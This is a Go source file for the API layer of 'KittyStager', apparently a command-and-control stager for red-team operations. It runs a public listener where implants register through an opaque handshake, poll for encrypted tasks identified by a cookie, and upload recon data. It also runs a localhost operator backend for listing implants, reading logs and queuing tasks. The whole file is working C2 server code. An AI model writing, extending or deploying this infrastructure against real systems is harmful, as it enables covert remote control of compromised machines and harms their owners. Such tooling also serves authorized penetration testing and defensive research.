package api

import (
	"KittyStager/internal/config"
	"KittyStager/internal/kitten"
	"KittyStager/internal/recon"
	"KittyStager/internal/task"
	"KittyStager/pkg/crypto"
	"fmt"
	"github.com/gin-gonic/gin"
	"golang.org/x/sync/errgroup"
	"io"
	"log"
	"os"
	"strconv"
	"time"
)

var (
	Kittens map[string]*kitten.Kitten
	conf    *config.Config
	g       errgroup.Group
	chacha  *crypto.ChaCha20
)

func init() {
	Kittens = make(map[string]*kitten.Kitten)
	chacha = crypto.NewChaCha20()
}

func Api(config *config.Config) error {
	localAddr := "127.0.0.1:1337"
	conf = config
	//Log for frontend
	f, err := os.Create("api.log")
	if err != nil {
		return err
	}
	gin.DefaultWriter = io.MultiWriter(f)
	front := gin.New()
	front.Use(gin.LoggerWithFormatter(func(param gin.LogFormatterParams) string {
		// your custom format
		return fmt.Sprintf("%s - %4s [%s] \"%s %9s %d\"\n",
			param.ClientIP,
			param.Request.Header.Get("Cookie"),
			param.TimeStamp.Format(time.RFC822),
			param.Method,
			param.Path,
			param.StatusCode,
		)
	}))
	front.Use(gin.Recovery())
	//gin.SetMode(gin.ReleaseMode)
	//front := gin.Default()
	front.GET(conf.GetGetEndpoint(), frontGetTaskByName)
	front.POST(conf.GetPostEndpoint(), frontPostRecon)
	front.POST(conf.GetOpaqueEndpoint(), frontPostReg)
	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())

	//Disable log for backend
	gin.DefaultWriter = io.Discard
	back := gin.Default()
	back.GET("kittensList", backGetKittensList)
	back.GET("conf", backGetConf)
	back.GET("logs", backGetLogs)
	back.GET("task/:name", backGetKittenTasks)
	back.POST("task/:name", backCreateTaskByName)
	//frontend
	g.Go(func() error {
		fmt.Printf("[*] Listening on %s\n", addr)
		return front.Run(addr)
	})
	//backend
	g.Go(func() error {
		fmt.Printf("[*] Listening on %s\n", localAddr)
		return back.Run(localAddr)
	})

	if err := g.Wait(); err != nil {
		log.Fatal(err)
	}
	return nil
}

// ------------------------
// frontend
// ------------------------
func frontGetTaskByName(c *gin.Context) {
	name := c.GetHeader("Cookie")
	tasks := Kittens[name].Tasks
	//take the last task
	var t *task.Task
	if len(tasks) == 1 {
		sleep := strconv.Itoa(conf.GetSleep())
		tasks[0].SetPayload([]byte(sleep))
		t = tasks[0]
	} else {
		t = tasks[len(tasks)-1]
	}
	marshalledTask, err := t.MarshallTask()
	if err != nil {
		return
	}
	e, err := chacha.Encrypt(marshalledTask, []byte(Kittens[name].Key))
	if err != nil {
		return
	}
	_, err = c.Writer.Write(e)
	if err != nil {
		return
	}
	if len(Kittens[name].Tasks) > 1 {
		Kittens[name].Tasks = Kittens[name].Tasks[:len(Kittens[name].Tasks)-1]
	}
	lastSeen := time.Now()
	Kittens[name].SetLastSeen(lastSeen)
}

func frontPostRecon(c *gin.Context) {
	name := c.GetHeader("Cookie")
	r := recon.NewRecon("", "", "", "", "", "", 0)
	data, err := io.ReadAll(c.Request.Body)
	if err != nil {
		return
	}
	d, err := chacha.Decrypt(data, []byte(Kittens[name].Key))
	if err != nil {
		return
	}
	err = r.UnmarshallTask(d)
	if err != nil {
		return
	}
	Kittens[name].SetRecon(r)
}
func frontPostReg(c *gin.Context) {
	var t []*task.Task
	sleep := strconv.Itoa(conf.GetSleep())
	t = append(t, task.NewTask("sleep", []byte(sleep)))
	t = append(t, task.NewTask("miniRecon", nil))
	data, err := io.ReadAll(c.Request.Body)
	if err != nil {
		return
	}
	dataToReturn, name, key := crypto.HandleAuth(data)
	_, err = c.Writer.Write(dataToReturn)
	if err != nil {
		return
	}
	kitty := kitten.Kitten{
		Name:     name,
		Sleep:    conf.Sleep,
		LastSeen: time.Now(),
		Alive:    true,
		Key:      key,
		Tasks:    t,
		Recon:    nil,
	}
	Kittens[kitty.Name] = &kitty
	go CheckAlive(name)
}

// ------------------------
// backend
// ------------------------
func backGetKittensList(c *gin.Context) {
	c.IndentedJSON(200, &Kittens)
}

func backGetConf(c *gin.Context) {
	c.IndentedJSON(200, &conf)
}

func backGetLogs(c *gin.Context) {
	b, err := os.ReadFile("api.log") // just pass the file name
	if err != nil {
		return
	}
	_, err = c.Writer.Write(b)
	if err != nil {
		return
	}
}

func backGetKittenTasks(c *gin.Context) {
	name := c.Param("name")
	t := Kittens[name].Tasks
	c.IndentedJSON(200, t)
}

func backCreateTaskByName(c *gin.Context) {
	name := c.Param("name")
	var t task.Task
	var b []byte
	b, err := io.ReadAll(c.Request.Body)
	err = t.UnmarshallTask(b)
	if err != nil {
		return
	}
	if t.Tag == "sleep" {
		t, err := strconv.Atoi(string(t.Payload))
		if err != nil {
			return
		}
		conf.SetSleep(t)
	}
	Kittens[name].SetTask(&t)
}
